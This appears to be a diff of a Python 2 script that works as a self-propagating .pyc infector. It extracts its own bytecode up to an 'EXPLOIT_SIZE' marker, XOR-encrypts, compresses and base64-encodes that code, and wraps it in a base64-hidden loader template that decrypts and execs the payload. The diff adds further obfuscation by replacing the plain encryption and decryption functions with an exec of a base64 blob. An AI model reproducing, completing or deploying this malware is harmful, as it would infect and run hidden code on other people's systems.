@@ -8,26 +8,17 @@ import glob
 from base64 import b64decode, b64encode
 import random
 
-
-def crypt(clear):
-    key = chr(random.randint(0, 255))
-    crypted = "".join(chr(ord(c) ^ ord(key)) for c in clear)
-
-    return key + crypted
+DECRYPT=None
+exec b64decode("IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCmltcG9ydCByYW5kb20KCgpkZWYgY3J5cHQoY2xlYXIpOgogICAga2V5ID0gY2hyKHJhbmRvbS5yYW5kaW50KDAsIDI1NSkpCiAgICBjcnlwdGVkID0gIiIuam9pbihjaHIob3JkKGMpIF4gb3JkKGtleSkpIGZvciBjIGluIGNsZWFyKQoKICAgIHJldHVybiBrZXkgKyBjcnlwdGVkCgoKREVDUllQVCA9ICIiIgpkZWYgZGVjcnlwdChjcnlwdGVkKToKICAgIGtleSA9IGNyeXB0ZWRbMF0KCiAgICByZXR1cm4gIiIuam9pbihjaHIob3JkKGMpIF4gb3JkKGtleSkpIGZvciBjIGluIGNyeXB0ZWRbMTpdKQoiIiIK")
 
 
 if __file__.endswith('.pyc'):
     template = b64decode("c2lnbmF0dXJlID0gIlBZXzIuNiIKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCmltcG9ydCB6bGliCmltcG9ydCBiYXNlNjQKaW1wb3J0IG1hcnNoYWwKCl9fREVDUllQVF9QTEFDRUhPTERFUl9fCgpwYXlsb2FkID0gIl9fUEFZTE9BRF9QTEFDRUhPTERFUl9fIgoKIyBkZS1iNjQgc3RlcApkZWI2NCA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZCkKCiMgZGUtY3J5cHQgc3RlcApkZWNyeXB0ID0gZGVjcnlwdChkZWI2NCkKCiMgZGUtY29tcHJlc3Mgc3RlcApkZWNvbXByZXNzID0gemxpYi5kZWNvbXByZXNzKGRlY3J5cHQpCgojIGRlLW1hcnNoYWwgc3RlcApkZW1hcnNoYWwgPSBtYXJzaGFsLmxvYWRzKGRlY29tcHJlc3MpCgojIGV4ZWMKZXhlYyBkZW1hcnNoYWwKCnNpZ25hdHVyZSA9ICJQWV8yLjYiCg==")
-    template = template.replace("__DECRYPT_PLACEHOLDER__", """
-def decrypt(crypted):
-    key = crypted[0]
-
-    return "".join(chr(ord(c) ^ ord(key)) for c in crypted[1:])
-""")
-
-
+    template = template.replace("__DECRYPT_PLACEHOLDER__", DECRYPT)
 
     # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
+    LOAD_CONST = None
+    RETURN_VALUE = None
     Code = None
     CodeList = None
     EXEC_STMT = None
@@ -45,12 +36,12 @@ def decrypt(crypted):
             EXPLOIT_SIZE = i + 2
             break
     if not EXPLOIT_SIZE:
-        print "EXPLoiT_ISZE not found"
+        print "EXPLOIT_SIZE not found"
 
     data.code = data.code[:EXPLOIT_SIZE]
-    data.code.append((LOAD_CONST,None))
-    data.code.append((RETURN_VALUE,None))
-    print "payload clair %s" % CodeList(data.code)
+    data.code.append((LOAD_CONST, None))
+    data.code.append((RETURN_VALUE, None))
+    # print "payload clair %s" % CodeList(data.code)
     payload = b64encode(crypt(zlib.compress(marshal.dumps(data.to_code()))))
     template = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
     payload = Code.from_code(compile(template, "z", "exec")).code
